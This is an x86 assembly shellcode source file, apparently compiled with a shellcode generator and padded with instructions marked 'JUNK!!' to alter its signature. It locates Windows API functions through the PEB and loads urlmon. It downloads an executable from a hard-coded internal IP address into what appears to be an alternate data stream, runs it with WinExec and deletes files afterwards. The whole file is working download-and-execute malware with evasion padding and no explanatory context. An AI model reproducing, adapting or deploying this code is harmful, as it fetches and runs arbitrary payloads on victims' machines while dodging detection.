; Shellcode generated using Shellcode Compiler
; https://github.com/NytroRST/ShellcodeCompiler

xor ecx, ecx
mov eax, [fs:ecx + 0x30]               ; EAX = PEB
mov eax, [eax + 0xc]                   ; EAX = PEB->Ldr
mov esi, [eax + 0x14]                  ; ESI = PEB->Ldr.InMemOrder
lodsd                                  ; EAX = Second module
xchg eax, esi                          ; EAX = ESI, ESI = EAX
lodsd                                  ; EAX = Third(kernel32)
mov ebx, [eax + 0x10]                  ; EBX = Base address
mov edx, [ebx + 0x3c]                  ; EDX = DOS->e_lfanew
add edx, ebx                           ; EDX = PE Header
mov edx, [edx + 0x78]                  ; EDX = Offset export table
add edx, ebx                           ; EDX = Export table
mov esi, [edx + 0x20]                  ; ESI = Offset namestable
add esi, ebx                           ; ESI = Names table
xor ecx, ecx                           ; EXC = 0

Get_Function:

inc ecx                                ; Increment the ordinal
lodsd                                  ; Get name offset
add eax, ebx                           ; Get function name
cmp dword [eax], 0x50746547            ; GetP
jnz Get_Function
cmp dword [eax + 0x4], 0x41636f72      ; rocA
jnz Get_Function
cmp dword [eax + 0x8], 0x65726464      ; ddre
jnz Get_Function
mov esi, [edx + 0x24]                  ; ESI = Offset ordinals
add esi, ebx                           ; ESI = Ordinals table
mov cx, [esi + ecx * 2]                ; Number of function
dec ecx
mov esi, [edx + 0x1c]                  ; Offset address table
add esi, ebx                           ; ESI = Address table
mov edx, [esi + ecx * 4]               ; EDX = Pointer(offset)
add edx, ebx                           ; EDX = GetProcAddress

mov ch, 0x6c                           ; START JUNK!!
mov cl, 0x6c
xor cl, ch
neg cl
neg ch
xor cl, ch                             ; END JUNK!
xor ecx, ecx                           ; ECX = 0
push ebx                               ; Kernel32 base address
push edx                               ; GetProcAddress
push ecx                               ; 0
push 0x41797261                        ; aryA
push 0x6e69614d                        ; JUNK!!
and eax, eax                           ; JUNK!!
pop eax                                ; JUNK!!
push 0x7262694c                        ; Libr
push 0x64616f4c                        ; Load
push esp                               ; LoadLibrary
push ebx                               ; Kernel32 base address
call edx                               ; GetProcAddress(LL)

add esp, 0xc                           ; pop LoadLibrary
sub esp, 0x3                           ; START JUNK!!
inc esp
inc esp
inc esp                                ; END JUNK!!
pop ecx                                ; ECX = 0
push eax                               ; EAX = LoadLibrary

mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!

xor eax, eax
mov ax, 0x6c6c
push eax
push 0x642e6e6f
and edx, edx                           ; JUNK!!
push 0x6d6c7275
push esp                               ; String on the stack
call [esp + 16]
add esp, 12
push eax                               ; DLL base on the stack

xor eax, eax
mov ax, 0x4165
push eax
and edx, edx                           ; JUNK!!
push 0x6c69466f
push 0x5464616f
and edx, edx                           ; JUNK!!
push 0x6c6e776f
and edx, edx                           ; JUNK!!
push 0x444c5255
push esp                               ; String on the stack
push dword [esp + 24]
call [esp + 36]
add esp, 20
push eax                               ; Function address on the stack

xor eax, eax
mov eax, 0x23636578
push eax
sub dword [esp + 3], 0x23
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push 0x456e6957
push esp                               ; String on the stack
push dword [esp + 28]
call [esp + 28]
add esp, 8
push eax                               ; Function address on the stack

xor eax, eax
mov eax, 0x2341656c
and edx, edx                           ; JUNK!!
push eax
sub dword [esp + 3], 0x23
push 0x69466574
and eax, eax                           ; JUNK!!
push 0x656c6544
push esp                               ; String on the stack
push dword [esp + 36]
call [esp + 36]
add esp, 12
push eax                               ; Function address on the stack

xor eax, eax
mov eax, 0x23726564
and edx, edx                           ; JUNK!!
push eax
sub dword [esp + 3], 0x23
push 0x616f6c6e
and eax, eax                           ; JUNK!!
sub esp, 0x3                           ; START JUNK!!
inc esp
inc esp
inc esp                                ; END JUNK!!
push 0x776f446e
push 0x69614d2f
push 0x39362e32
and ecx, ecx                           ; JUNK!!
push 0x2e302e30
and eax, eax                           ; JUNK!!
push 0x312f2f3a
push esp                               ; JUNK!!
pop eax                                ; JUNK!!
push 0x70747468
push esp

xor eax, eax
mov al, 0x72
and edx, edx                           ; JUNK!!
push eax
push 0x6564616f
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push 0x6c6e776f
push 0x643a6578
push 0x6e69614d                        ; JUNK!!
and eax, eax                           ; JUNK!!
pop eax                                ; JUNK!!
push 0x652e7265
push 0x64616f6c
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push 0x6e776f44
push 0x6e69614d
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah
neg al
neg ah
xor al, ah                             ; END JUNK!
push esp

xor eax, eax
push eax
and eax, eax                           ; JUNK!!
and edx, edx                           ; JUNK!!
xor eax, eax
push eax
push dword [ESP + 8]
push dword [ESP + 48]
and edx, edx                           ; JUNK!!
xor eax, eax
push eax
call [ESP + 100]
add ESP, 72
xor eax, eax
mov al, 0x72
push eax
push 0x6564616f
and eax, eax                           ; JUNK!!
sub esp, 0x7                           ; START JUNK!!
inc esp
inc esp
inc esp
add esp, 0x4                           ; END JUNK!!
push 0x6c6e776f
push 0x643a6578
push 0x6e69614d                        ; JUNK!!
and eax, eax                           ; JUNK!!
pop eax                                ; JUNK!!
push 0x652e7265
and eax, eax                           ; JUNK!!
add esp, 0x3                           ; START JUNK!!
inc esp
inc esp
inc esp
sub esp, 0x6                           ; END JUNK!!
push 0x64616f6c
push 0x6e776f44
push 0x6e69614d
and eax, eax                           ; JUNK!!
add esp, 0x3                           ; START JUNK!!
inc esp
inc esp
inc esp
sub esp, 0x6                           ; END JUNK!!
push esp

xor eax, eax
push eax
and eax, eax                           ; JUNK!!
push dword [ESP + 4]
call [ESP + 48]
and eax, eax                           ; JUNK!!
add ESP, 36
xor eax, eax
mov al, 0x72
push eax
push 0x6564616f
push 0x6c6e776f
and eax, eax                           ; JUNK!!
add esp, 0x3                           ; START JUNK!!
inc esp
inc esp
inc esp
sub esp, 0x6                           ; END JUNK!!
push 0x643a6578
push 0x652e7265
push 0x6e69614d                        ; JUNK!!
and eax, eax                           ; JUNK!!
pop eax                                ; JUNK!!
push 0x64616f6c
and eax, eax                           ; JUNK!!
add esp, 0x3                           ; START JUNK!!
inc esp
inc esp
inc esp
sub esp, 0x6                           ; END JUNK!!
push 0x6e776f44
push 0x6e69614d
push esp

push dword [ESP + 0]
call [ESP + 40]
add ESP, 36
and eax, eax                           ; JUNK!!
xor eax, eax
mov ax, 0x6578
push eax
push 0x652e7265
and eax, eax                           ; JUNK!!
add esp, 0x3                           ; START JUNK!!
inc esp
inc esp
inc esp
sub esp, 0x6                           ; END JUNK!!
push 0x64616f6c
push 0x6e776f44
push 0x6e69614d                        ; JUNK!!
and eax, eax                           ; JUNK!!
pop eax                                ; JUNK!!
push 0x6e69614d
and eax, eax                           ; JUNK!!
add esp, 0x3                           ; START JUNK!!
inc esp
inc esp
inc esp
sub esp, 0x6                           ; END JUNK!!
push esp

push dword [ESP + 0]
call [ESP + 28]
add ESP, 24
